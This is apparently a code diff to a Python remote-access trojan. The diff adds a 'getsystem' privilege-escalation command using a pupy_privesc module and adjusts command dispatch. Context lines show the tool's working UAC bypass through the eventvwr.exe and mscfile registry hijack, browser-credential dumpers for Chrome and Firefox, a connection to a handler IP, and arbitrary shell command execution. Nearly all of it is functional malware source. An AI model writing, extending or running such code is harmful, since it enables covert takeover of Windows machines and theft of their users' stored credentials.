@@ -5,7 +5,7 @@ from twisted.internet import reactor
 from twisted.protocols import socks
 import dumpff
 if os.name =="nt":
-    import dumpchrome, win32net
+    import dumpchrome, win32net, pupy_privesc
 
 HANDLER_IP = "127.0.0.1"
 
@@ -258,9 +258,18 @@ class Shell:
 		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		print self.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
 		os.startfile("eventvwr.exe")
-		time.sleep(5)
+		time.sleep(2)
 		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		return "A new session with admin privileges should appear in the next 30 seconds."
+		
+	@windows_only
+	def get_system(self):
+		if not self.is_admin(): return "You need to have admin privileges to run getsystem!"
+		try:
+			pupy_privesc.getsystem(os.path.abspath(sys.executable))
+		except Exception as e:
+			return "Failed, try again. "+str(e)
+		return "A new session with SYSTEM privileges should appear in the next 30 seconds."
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -294,10 +303,13 @@ class Shell:
 		elif command == "dumpchrome":
 			output = self.dumpchrome()
 		elif command == "isadmin":
-			return str(self.is_admin())
+			output = str(self.is_admin())
 		elif command == "bypassuac":
-			return self.bypass_uac()
+			output = self.bypass_uac()
+		elif command == "getsystem":
+			output = self.get_system()
 		elif command == "die":
+			self.comm_socket.close()
 			os._exit(0)
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
